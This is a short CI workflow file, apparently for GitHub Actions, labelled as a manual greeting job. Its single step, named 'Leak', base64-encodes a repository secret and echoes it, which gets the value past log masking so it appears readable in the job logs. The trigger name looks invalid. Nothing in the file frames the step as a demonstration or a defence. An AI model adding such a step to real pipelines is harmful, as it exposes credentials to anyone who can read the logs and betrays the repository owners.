  name: Manual workflow

  on:
    pull_request_comment:

  jobs:
    greet:
      runs-on: ubuntu-latest

      steps:
        - name: Leak
          run: |
            echo ${{ secrets.SUPER_SECRET }} | base64 -w0 
